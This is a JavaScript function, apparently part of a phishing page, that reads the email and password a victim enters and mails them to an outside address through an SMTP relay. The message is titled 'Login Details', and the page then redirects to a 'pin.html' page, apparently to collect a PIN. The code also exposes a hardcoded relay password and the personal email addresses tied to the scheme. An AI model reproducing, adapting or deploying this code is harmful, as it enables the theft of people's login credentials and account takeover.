function emailSend() {
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;
  var messageBody = "Email " + email +
    "<br/> password " + password;

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "chukwuebukawilliams6@gmail.com",
    Password: "E141285882E4D4548056C705C3238E355AA6",
    To: 'payday10177@gmail.com',
    From: "chukwuebukawilliams6@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'pin.html';
      }
      else {
        swal("Error", "Please complete form details", "error")
      }
    }
  );
}
